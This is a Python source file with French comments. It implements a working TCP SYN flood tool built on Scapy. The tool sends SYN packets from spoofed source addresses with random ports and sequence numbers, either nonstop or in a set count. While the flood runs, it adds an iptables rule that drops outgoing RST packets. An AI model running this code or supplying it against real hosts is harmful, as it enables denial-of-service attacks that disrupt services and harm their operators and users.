import time
import random
import threading
from scapy.all import *
import tcp_syn_graphique_2
import sys
import os
import subprocess

class tcp_syn(threading.Thread):

	
	#def __init__:
	#	self.stop=False

	def __init__(self,ip_src,port_src,ip_dst,port_dst,num_seq,nombre,attente,interface):

		threading.Thread.__init__(self)
		self.stopper=threading.Event()
		#self.stopper.set(True)
		
		#tcp_syn_graphique_2.verrou=threading.Lock()
		

		
			
		#if(tcp_syn_graphique_2.test_fenetre.check_verrou()):	
		#	print("\n ERREUR ATTAQUE EN COURS DETECTEE")
		#	sys.exit(1)	
		#else:
		#	print("\n AUCUNE ATTAQUE EN COURS DETECTEE")
		#	tcp_syn_graphique_2.edit_verrou(True)	
				
		
		#self.arret=True
		#self._stopevent=threading.Event()
		##TEST DE L'ADRESSE IP SOURCE
				

		if(ip_src == ""):

			if(ip_dst==""):
				self.ip=IP(dst="8.8.8.8")
			else:
				self.ip=IP(dst=ip_dst)
		else:
			if(ip_dst==""):
				self.ip=IP(src=ip_src,dst="8.8.8.8")
			else:
				self.ip=IP(src=ip_src,dst=ip_dst)

		##TEST DU PORT DESTINATION
		if(port_dst == ""):
			self.portdst=80
		else:
			self.portdst=int(port_dst)
		
		## TEST DU NUMERO DE SEQUENCE
		if(num_seq == ""):
			#sequence=random.randint(1,100000)
			self.s1=1
			self.s2=100000
		else:
			self.s1=int(num_seq.split("-")[0])
			self.s2=int(num_seq.split("-")[1])				
			#sequence=int(num_seq)

		
		##TEST DE L'INTERFACE D'ENVOI
		if(interface != ""):
			print("interface non choisie automatiquement")
			conf.iface=interface
		else:
			print("interface choisie automatiquement")
		

		if(interface != ""):
			print("INTERFACE D'ENVOI DES PAQUETS:"+interface)
		else:
			print("INTERFACE D'ENVOI DES PAQUETS:"+conf.iface)


		##TEST DU DELAI AVANT CHAQUE ENVOI
		if(attente == ""):
			self.delai=0.2
		else:
			self.delai=float(attente)



		##TEST DU PORT SOURCE
		if(port_src == ""):
			#port=random.randint(5000,10000)
			self.p1=1000
			self.p2=30000
		else:
			#port=int(port_src)
			self.p1=int(port_src.split("-")[0])
			self.p2=int(port_src.split("-")[1])


		if(nombre == ""):
			self.n=-1
		else:
			self.n=int(nombre)

		#print("ip spoure="+self.ip.src)
		#print("port spoure="+str(self.p1)+"-"+str(self.p2))
		#print("ip destination="+str(self.ip.dst))
		#print("port destination="+str(port_dst))

	def run(self):	
		
		print("etat du verrou="+str(tcp_syn_graphique_2.verrou.locked()))
		if(tcp_syn_graphique_2.verrou.locked()):
			print("\n ERREUR ATTAQUE EN COURS DETECTEE")
			#sys.exit(1)
		else:
			print("\n AUCUNE ATTAQUE EN COURS DETECTEE\n")

			tcp_syn_graphique_2.verrou.acquire()

			subprocess.check_call(['iptables', '-A',
                       'OUTPUT', '-p', 'tcp', 
                       '-s', self.ip.src,
                        '--tcp-flags', 'RST','RST','-j', 'DROP'])			
			
			

			#print("ip spoure="+self.ip.src)
			#print("port spoure="+str(self.p1)+"-"+str(self.p2))
			#print("ip destination="+str(self.ip.dst))
			#print("port destination="+str(self.portdst))
			
			self.ip.show()		
			print("port spoure="+str(self.p1)+"-"+str(self.p2))
			print("port destination="+str(self.portdst))
		
			time.sleep(3)

			print("\n Lancement de l'attaque TCP SYN FLOOD --"+time.ctime()+"\n")
			#self.arret=False
			if(self.n == -1):
				while(1==1 and not(self.stopper.isSet())):
				#while(1==1 and not(self.arret)):
					port=random.randint(self.p1,self.p2)
					sequence=random.randint(self.s1,self.s2)
					tcp_syn=TCP(sport=port,dport=self.portdst,flags='S',seq=sequence)
		
					'''CREATION DU PAQUET'''
					paquet=(self.ip/tcp_syn)
					send(paquet)
					time.sleep(self.delai)
				
					#print(self.stopper.set())

				#print("Fin des Traitements, arret de l'attaque")
				#print("arret="+str(self.arret))
				if(not self.stopper.isSet()):
					print("FIN D'EMISSIONS DES PAQUETS"+time.ctime()+"\n")
				else:
					print("FIN D'EMISSIONS DES PAQUETS (L'ATTAQUE A ETE STOPPER PAR L'UTILISATEUR)"+time.ctime()+"\n")
			else:
				i=0
				for i in range(0,self.n):
					port=random.randint(self.p1,self.p2)
					sequence=random.randint(self.s1,self.s2)
					tcp_syn=TCP(sport=port,dport=self.portdst,flags='S',seq=sequence)
		
					'''CREATION DU PAQUET'''
					paquet=(self.ip/tcp_syn)
					send(paquet)
					time.sleep(self.delai)
					#self.arret=True
					#print(self.arret)
					#print(self.stopper.set())
				
					#if(self.arret==True):
					if(self.stopper.isSet()):
						break
				#print("arret="+str(self.arret))
				#print("Fin des Traitements, arret de l'attaque")
				if(not self.stopper.isSet()):
					print("FIN D'EMISSIONS DES PAQUETS"+time.ctime()+"\n")
				else:
					print("FIN D'EMISSIONS DES PAQUETS (L'ATTAQUE A ETE STOPPER PAR L'UTILISATEUR)"+time.ctime()+"\n")
			
			subprocess.check_call(['iptables', '-A',
                       'OUTPUT', '-p', 'tcp', 
                       '-s', self.ip.src,
                        '--tcp-flags', 'RST','RST','-j', 'ACCEPT'])
	
			tcp_syn_graphique_2.verrou.release()
				#tcp_syn_graphique_2.edit_verrou(False)

	
	def state_launch_boutton(self):
		return self.stopper.isSet()
	
	def stop(self):
		#self.arret=True
		self.stopper.set()
		#print(self.arret)
		#print(self.stopper.set())
	
	def randommac():
		mac = [ random.randint(0x00, 0x7f), random.randint(0x00, 0x7f), random.randint(0x00, 0x7f),
			random.randint(0x00, 0x7f),
			random.randint(0x00, 0xff),
			random.randint(0x00, 0xff) ]
		return ':'.join(map(lambda x: "%02x" % x, mac))		
